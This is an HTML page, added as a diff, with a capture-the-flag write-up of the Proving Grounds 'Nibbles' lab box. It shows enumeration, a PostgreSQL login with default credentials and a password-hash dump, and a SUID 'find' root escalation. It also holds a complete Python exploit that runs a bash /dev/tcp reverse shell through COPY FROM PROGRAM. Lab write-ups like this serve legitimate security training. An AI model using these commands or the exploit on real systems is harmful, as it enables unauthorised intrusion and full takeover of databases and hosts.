@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Nibbles Writeup - Rachel Murphy" />
+  <title>PG: Nibbles | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Nibbles — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / PostgreSQL / Privilege Escalation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Nibbles is a Linux VM with a vulnerable PostgreSQL database. The goal is to exploit default credentials and a remote code execution vulnerability to gain an initial shell as postgres, then escalate privileges using a misconfigured SUID binary (find) to obtain root.</p>
+    </section>
+
+    <!-- Enumeration -->
+    <section class="enumeration">
+      <h2>Enumeration</h2>
+      <p>Full port scan:</p>
+      <pre><code>sudo nmap -p- -sC -sV 192.168.236.47  -oN nmap-nibbles</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710192504.png" alt="Nmap scan results">
+      <p>Open services detected: Postgres, FTP, SSH, HTTP. SMB ports closed.</p>
+
+      <h3>FTP</h3>
+      <img class="screenshot" src="../images/Pasted image 20250710192633.png" alt="FTP service check">
+
+      <h3>Web (Port 80)</h3>
+      <img class="screenshot" src="../images/Pasted image 20250710192805.png" alt="Web homepage">
+      <img class="screenshot" src="../images/Pasted image 20250710193008.png" alt="Web page template">
+      <img class="screenshot" src="../images/Pasted image 20250710193135.png" alt="Static image page">
+
+      <h3>Directory Discovery with Ferox</h3>
+      <pre><code>feroxbuster -u http://192.168.236.47/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710193208.png" alt="Feroxbuster results">
+      <p>Rerun with PHP and TXT extensions:</p>
+      <pre><code>feroxbuster -u http://192.168.236.47/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -o ferox.out</code></pre>
+
+      <h3>SMB</h3>
+      <pre><code>nxc smb 192.168.236.47 -u 'root' -p 'root' --shares</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710193502.png" alt="SMB enumeration">
+
+    </section>
+
+    <!-- PostgreSQL Exploitation -->
+    <section class="postgres-exploitation">
+      <h2>PostgreSQL Exploitation</h2>
+      <p>Default postgres credentials attempt:</p>
+      <pre><code>psql -h 192.168.236.47 -p 5437 -U 'postgres' -w</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710193847.png" alt="Postgres connection fail">
+
+      <p>Using username: postgres, password: postgres</p>
+      <pre><code>psql -h 192.168.236.47 -p 5437 -U 'postgres' -W</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710194035.png" alt="Postgres login success">
+
+      <h3>Database Enumeration</h3>
+      <pre><code>\l</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710194350.png" alt="List databases">
+
+      <pre><code>\c template1;</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710195000.png" alt="Connect template1">
+
+      <h3>Extract Users & Password Hashes</h3>
+      <pre><code>select usename, passwd from pg_shadow;</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710195338.png" alt="Postgres user info">
+
+      <h3>Attempt Remote Code Execution</h3>
+      <p>Creating PHP shell via COPY command (permissions restricted):</p>
+      <img class="screenshot" src="../images/Pasted image 20250710200630.png" alt="Attempt PHP web shell upload">
+      <img class="screenshot" src="../images/Pasted image 20250710200735.png" alt="Permission denied">
+
+      <p>Used Python RCE exploit for Postgres 11.7</p>
+      <img class="screenshot" src="../images/Pasted image 20250710211600.png" alt="Postgres RCE GitHub">
+      <img class="screenshot" src="../images/Pasted image 20250710211858.png" alt="Exploit variables configured">
+
+      <p>Executed exploit to get reverse shell:</p>
+      <img class="screenshot" src="../images/Pasted image 20250710215717.png" alt="Reverse shell obtained">
+
+      <p>Spawn TTY shell for usability:</p>
+      <img class="screenshot" src="../images/Pasted image 20250710220117.png" alt="TTY shell">
+      <img class="screenshot" src="../images/Pasted image 20250710220237.png" alt="Postgres limited shell">
+    </section>
+
+    <!-- Privilege Escalation -->
+    <section class="privilege-escalation">
+      <h2>Privilege Escalation</h2>
+      <p>Searched for SUID binaries:</p>
+      <pre><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710221136.png" alt="SUID binaries found">
+
+      <p>Used GTFOBins 'find' technique for root shell:</p>
+      <pre><code>/usr/bin/find . -exec /bin/sh -p \; -quit</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250710221424.png" alt="GTFOBins find root shell">
+      <img class="screenshot" src="../images/Pasted image 20250710221604.png" alt="Root shell obtained">
+
+      <p>Grabbed user flag (wilson):</p>
+      <img class="screenshot" src="../images/Pasted image 20250710221705.png" alt="Wilson's flag">
+    </section>
+
+    <!-- Exploit Code -->
+    <section class="exploit-code">
+      <h2>Exploit Code</h2>
+      <pre><code>#!/usr/bin/env python3
+import psycopg2
+import traceback
+
+RHOST = '192.168.236.47'
+RPORT = 5437
+LHOST = '192.168.45.152'
+LPORT = 80
+USER = 'postgres'
+PASSWD = 'postgres'
+
+with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
+    try:
+        cur = conn.cursor()
+        print("[!] Connected to the PostgreSQL database")
+        rev_shell = (f"bash -c 'exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done'")
+        safe_payload = rev_shell.replace("'", "''")
+        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
+        cur.execute('DROP TABLE IF EXISTS cmd_exec')
+        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
+        cur.execute(f"COPY cmd_exec FROM PROGRAM '{safe_payload}'")
+        cur.execute('SELECT * from cmd_exec')
+        v = cur.fetchall()
+        print(v)
+        cur.close()
+
+    except Exception as e:
+        print(f"[!] Something went wrong: {e}")
+        traceback.print_exc()</code></pre>
+    </section>
+
+    <!-- Summary -->
+    <section class="summary">
+      <h2>Box Summary</h2>
+      <ul>
+        <li>Enumerated open ports and services: PostgreSQL, FTP, SSH, HTTP.</li>
+        <li>Exploited PostgreSQL using default credentials and authenticated RCE.</li>
+        <li>Obtained limited shell as postgres and explored file system.</li>
+        <li>Privilege escalation via SUID misconfigured find binary using GTFOBins technique.</li>
+        <li>Captured user and root flags.</li>
+        <li>Learned techniques for Postgres enumeration, RCE, and SUID-based privilege escalation.</li>
+      </ul>
+    </section>
+
+  </main>
+</body>
+</html>
